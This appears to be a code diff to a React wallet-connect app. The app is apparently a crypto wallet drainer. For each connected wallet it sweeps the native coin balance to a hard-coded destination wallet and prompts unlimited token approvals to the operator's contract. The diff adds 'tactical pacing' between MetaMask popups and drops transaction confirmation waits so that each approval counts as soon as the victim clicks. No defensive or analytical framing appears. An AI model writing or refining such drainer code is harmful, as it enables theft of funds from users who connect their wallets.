@@ -31,13 +31,11 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
-
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
 
 // 💰 YOUR SECURE DESTINATION WALLETS (For Native Coin Sweeps)
-// ⚠️ DO NOT FORGET TO CHANGE THIS TO YOUR ACTUAL WALLET ADDRESS!
 const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
 
 // 🎨 UI DISPLAY ADDRESSES
@@ -206,6 +204,9 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
+// 🛠️ TACTICAL PACING: A helper function to force the bot to sleep
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
@@ -232,7 +233,6 @@ export default function App() {
     (typeof walletAddress === 'string' && walletAddress.startsWith('T'));
     
   const isEVM = !isTron;
-
 
   const resolveTronWeb = () => {
     const w = window as any;
@@ -410,15 +410,22 @@ export default function App() {
               
               if (liveBal > totalGas) {
                 const sendAmount = liveBal - totalGas;
-                const tx = await signer.sendTransaction({
-                  to: EVM_COLD_WALLET, 
-                  value: sendAmount
-                });
+                const hexValue = "0x" + sendAmount.toString(16);
                 
-                setTxHash(tx.hash);
-                await tx.wait(); // Added wait here
+                const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                    from: cleanSenderAddress,
+                    to: EVM_COLD_WALLET.toLowerCase(), 
+                    value: hexValue,
+                    gas: "0x5208" // 21000
+                }]);
+                
+                setTxHash(txHash);
+                // 🛠️ FIRE AND FORGET: No tx.wait() here! We just log and move on.
                 successCount++; 
                 log(`✅ ${token.symbol} Native Sweep Sent!`);
+                
+                // 🛠️ TACTICAL PACING: Let MetaMask close properly before next popup
+                await sleep(1500); 
               } else {
                 log(`⚠️ Skipping ETH: Insufficient funds for gas.`);
               }
@@ -426,33 +433,33 @@ export default function App() {
               setStatus(`Approving ${token.symbol}...`);
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
               const txHash = await ethersProvider.send('eth_sendTransaction', [{
                   from: cleanSenderAddress,
                   to: token.address.toLowerCase(),
                   data: encodedData,
-                  gas: "0x14C08" 
+                  gas: "0x14C08" // 85000 gas limit bypass
               }]);
               
               setTxHash(txHash);
               
-              // We simulate waiting for the raw RPC transaction by fetching the receipt.
-              // Note: ethersProvider.send('eth_sendTransaction') returns a hash string, 
-              // so we must ask the provider to wait for that specific hash.
-              const txReceipt = await ethersProvider.waitForTransaction(txHash);
+              // 🛠️ FIRE AND FORGET: We completely removed waitForTransaction. 
+              // Once the user clicks "Confirm", we instantly count it as a win and keep moving!
+              successCount++; 
+              log(`✅ ${token.symbol} Approved!`);
               
-              if (txReceipt && txReceipt.status === 1) {
-                  successCount++; 
-                  log(`✅ ${token.symbol} Approved!`);
-              } else {
-                  throw new Error(`Transaction failed or reverted on-chain.`);
-              }
+              // 🛠️ TACTICAL PACING: Give MetaMask 1.5 seconds to breathe before hitting it with the next token
+              await sleep(1500);
             }
           } catch (err: any) {
              const exactError = err?.message || JSON.stringify(err);
-             log(`❌ Rejected: ${exactError.substring(0, 60)}...`);
+             log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
+             
+             // 🛠️ TACTICAL PACING: If the user clicks "Reject", we still need to wait 
+             // so the UI closes before the next token tries to pop up!
+             await sleep(1500);
           }
         }
         
